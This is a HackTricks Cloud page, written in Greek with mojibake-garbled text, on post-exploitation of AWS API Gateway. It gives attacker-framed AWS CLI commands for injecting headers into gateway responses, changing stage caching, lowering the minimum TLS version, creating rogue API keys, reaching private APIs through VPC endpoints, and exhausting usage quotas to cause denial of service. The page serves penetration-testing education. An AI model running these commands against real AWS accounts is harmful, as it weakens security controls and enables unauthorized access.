# AWS - ÎœÎµÏ„Î¬ Ï„Î·Î½ Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î·Ï‚ API Gateway

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ÏƒÏ„Î·Î½ ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs** ÏƒÏ„Î± [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## API Gateway

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Î· ÎµÎºÏ„ÎµÎ¸ÎµÎ¹Î¼Î­Î½ÎµÏ‚ APIs

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± ÏƒÎ·Î¼ÎµÎ¯Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿ [https://us-east-1.console.aws.amazon.com/vpc/home#CreateVpcEndpoint](https://us-east-1.console.aws.amazon.com/vpc/home?region=us-east-1#CreateVpcEndpoint:) Î¼Îµ Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± `com.amazonaws.us-east-1.execute-api`, Î½Î± ÎµÎºÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î¿ ÏƒÎ·Î¼ÎµÎ¯Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÎµ Î­Î½Î± Î´Î¯ÎºÏ„Ï…Î¿ ÏŒÏ€Î¿Ï… Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· (ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î¼Î­ÏƒÏ‰ Î¼Î¹Î±Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚ EC2) ÎºÎ±Î¹ Î½Î± Î±Î½Î±Î¸Î­ÏƒÎµÏ„Îµ Î­Î½Î± Î¿Î¼Î¬Î´Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚.\
Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Ï€ÏŒ Ï„Î· Î¼Î·Ï‡Î±Î½Î® EC2 Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ ÏƒÎ·Î¼ÎµÎ¯Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÎºÎ±Î¹ ÏƒÏ…Î½ÎµÏ€ÏÏ‚ Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï€ÏÎ»Î· API Ï€Î¿Ï… Î´ÎµÎ½ ÎµÎ¯Ï‡Îµ ÎµÎºÏ„ÎµÎ¸ÎµÎ¯ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚.

### Î§ÏÎ®ÏƒÎ· Î£Ï‡ÎµÎ´Î¯Ï‰Î½ DoS

Î£Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± **Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·Ï‚** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï€ÏÏ‚ Î½Î± **Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿ ÏƒÏ‡Î­Î´Î¹Î¿ Ï‡ÏÎ®ÏƒÎ·Ï‚** Ï„Ï‰Î½ ÎºÎ»ÎµÎ¹Î´Î¹ÏÎ½. Î‘Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ **Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿** ÏƒÎµ X Ï‡ÏÎ®ÏƒÎµÎ¹Ï‚ **Î±Î½Î¬ Î¼Î®Î½Î±**, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î±Ï€Î»Î¬ Î½Î± Ï„Î¿ **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Î­Î½Î± DoS**.

Î¤Î¿ **ÎšÎ»ÎµÎ¹Î´Î¯ API** Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î±Ï€Î»ÏÏ‚ Î½Î± **ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î·Ï†Î¸ÎµÎ¯** Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± **ÎºÎµÏ†Î±Î»Î¯Î´Î± HTTP** Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **`x-api-key`**.

### `apigateway:UpdateGatewayResponse`, `apigateway:CreateDeployment`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ `apigateway:UpdateGatewayResponse` ÎºÎ±Î¹ `apigateway:CreateDeployment` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î¼Î¹Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± Î‘Ï€Î¬Î½Ï„Î·ÏƒÎ· Î ÏÎ»Î·Ï‚ Î³Î¹Î± Î½Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿Ï…Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ Î® Ï€ÏÏŒÏ„Ï…Ï€Î± Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Î´Î¹Î±ÏÏÎ­Î¿Ï…Î½ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î® ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î± scripts**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
RESPONSE_TYPE="DEFAULT_4XX"

# Update the Gateway Response
aws apigateway update-gateway-response --rest-api-id $API_ID --response-type $RESPONSE_TYPE --patch-operations op=replace,path=/responseTemplates/application~1json,value="{\"message\":\"$context.error.message\", \"malicious_header\":\"malicious_value\"}"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Î Î¹Î¸Î±Î½Î® Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·**: Î”Î¹Î±ÏÏÎ¿Î® ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½, ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Ï‰Î½ ÏƒÎµÎ½Î±ÏÎ¯Ï‰Î½, Î® Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï€ÏŒÏÎ¿Ï…Ï‚ Ï„Î¿Ï… API.

{% hint style="info" %}
Î‘Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î´Î¿ÎºÎ¹Î¼Î®
{% endhint %}

### `apigateway:UpdateStage`, `apigateway:CreateDeployment`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ `apigateway:UpdateStage` ÎºÎ±Î¹ `apigateway:CreateDeployment` Î¼Ï€Î¿ÏÎµÎ¯ **Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î­Î½Î± Ï…Ï€Î¬ÏÏ‡Î¿Î½ ÏƒÏ„Î¬Î´Î¹Î¿ Ï„Î¿Ï… API Gateway Î³Î¹Î± Î½Î± Î±Î½Î±ÎºÎ±Ï„ÎµÏ…Î¸ÏÎ½ÎµÎ¹ Ï„Î·Î½ ÎºÎ¯Î½Î·ÏƒÎ· ÏƒÎµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ ÏƒÏ„Î¬Î´Î¹Î¿ Î® Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÎºÏÏ…Ï†Î®Ï‚ Î¼Î½Î®Î¼Î·Ï‚ Î³Î¹Î± Î½Î± ÎºÎµÏÎ´Î¯ÏƒÎµÎ¹ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎºÏÏ…Ï†Î­Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Î±**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
STAGE_NAME="Prod"

# Update the API Gateway stage
aws apigateway update-stage --rest-api-id $API_ID --stage-name $STAGE_NAME --patch-operations op=replace,path=/cacheClusterEnabled,value=true,op=replace,path=/cacheClusterSize,value="0.5"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Î Î¹Î¸Î±Î½Î® Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·**: ÎœÎ· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎºÏÏ…Ï†Î¬ Î´ÎµÎ´Î¿Î¼Î­Î½Î±, Î´Î¹Î±Ï„Î±ÏÎ±Ï‡Î® Î® Ï€Î±ÏÎµÎ¼Ï€ÏŒÎ´Î¹ÏƒÎ· Ï„Î·Ï‚ ÎºÎ¯Î½Î·ÏƒÎ·Ï‚ Ï„Î¿Ï… API.

{% hint style="info" %}
Î‘Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î´Î¿ÎºÎ¹Î¼Î®
{% endhint %}

### `apigateway:PutMethodResponse`, `apigateway:CreateDeployment`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ `apigateway:PutMethodResponse` ÎºÎ±Î¹ `apigateway:CreateDeployment` Î¼Ï€Î¿ÏÎµÎ¯ **Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… ÎµÎ½ÏŒÏ‚ Ï…Ï€Î¬ÏÏ‡Î¿Î½Ï„Î¿Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… API Gateway REST Î³Î¹Î± Î½Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿Ï…Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ Î® Ï€ÏÏŒÏ„Ï…Ï€Î± Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Î´Î¹Î±ÏÏÎ­Î¿Ï…Î½ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î® ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î± scripts**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
STATUS_CODE="200"

# Update the method response
aws apigateway put-method-response --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --status-code $STATUS_CODE --response-parameters "method.response.header.malicious_header=true"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Î Î¹Î¸Î±Î½Î® Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·**: Î”Î¹Î±ÏÏÎ¿Î® ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½, ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Ï‰Î½ ÏƒÎµÎ½Î±ÏÎ¯Ï‰Î½ Î® Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï€ÏŒÏÎ¿Ï…Ï‚ Ï„Î¿Ï… API.

{% hint style="info" %}
Î‘Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î´Î¿ÎºÎ¹Î¼Î®
{% endhint %}

### `apigateway:UpdateRestApi`, `apigateway:CreateDeployment`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ `apigateway:UpdateRestApi` ÎºÎ±Î¹ `apigateway:CreateDeployment` Î¼Ï€Î¿ÏÎµÎ¯ **Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… API Gateway REST API Î³Î¹Î± Î½Î± Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î·Î½ ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î® ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ Î® Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ Ï„Î·Î½ ÎµÎ»Î¬Ï‡Î¹ÏƒÏ„Î· Î­ÎºÎ´Î¿ÏƒÎ· TLS, Î¼Îµ Î´Ï…Î½Î·Ï„Î¹ÎºÎ® Î±Ï€ÏŒÎ´Ï…Î½Î±Î¼Ï‰ÏƒÎ· Ï„Î·Ï‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ Ï„Î¿Ï… API**.
```bash
API_ID="your-api-id"

# Update the REST API settings
aws apigateway update-rest-api --rest-api-id $API_ID --patch-operations op=replace,path=/minimumTlsVersion,value='TLS_1.0',op=replace,path=/apiKeySource,value='AUTHORIZER'

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Î Î¹Î¸Î±Î½Î® Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·**: Î‘Ï€Î¿Î´Ï…Î½Î¬Î¼Ï‰ÏƒÎ· Ï„Î·Ï‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ Ï„Î¿Ï… API, Ï€Î¹Î¸Î±Î½ÏÏ‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î® Ï„Î·Î½ Î±Ï€Î¿ÎºÎ¬Î»Ï…ÏˆÎ· ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½.

{% hint style="info" %}
Î‘Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î´Î¿ÎºÎ¹Î¼Î®
{% endhint %}

### `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, `apigateway:CreateUsagePlanKey`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan` ÎºÎ±Î¹ `apigateway:CreateUsagePlanKey` Î¼Ï€Î¿ÏÎµÎ¯ **Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î½Î­Î± ÎºÎ»ÎµÎ¹Î´Î¹Î¬ API, Î½Î± Ï„Î± ÏƒÏ…ÏƒÏ‡ÎµÏ„Î¯ÏƒÎµÎ¹ Î¼Îµ ÏƒÏ‡Î­Î´Î¹Î± Ï‡ÏÎ®ÏƒÎ·Ï‚ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î±Ï…Ï„Î¬ Ï„Î± ÎºÎ»ÎµÎ¹Î´Î¹Î¬ Î³Î¹Î± Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ APIs**.
```bash
# Create a new API key
API_KEY=$(aws apigateway create-api-key --enabled --output text --query 'id')

# Create a new usage plan
USAGE_PLAN=$(aws apigateway create-usage-plan --name "MaliciousUsagePlan" --output text --query 'id')

# Associate the API key with the usage plan
aws apigateway create-usage-plan-key --usage-plan-id $USAGE_PLAN --key-id $API_KEY --key-type API_KEY
```
**Î Î¹Î¸Î±Î½Î® Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·**: ÎœÎ· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï€ÏŒÏÎ¿Ï…Ï‚ Ï„Î¿Ï… API, Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· ÎµÎ»Î­Î³Ï‡Ï‰Î½ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚.

{% hint style="info" %}
Î‘Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ Î´Î¿ÎºÎ¹Î¼Î®
{% endhint %}

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Î¤Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>
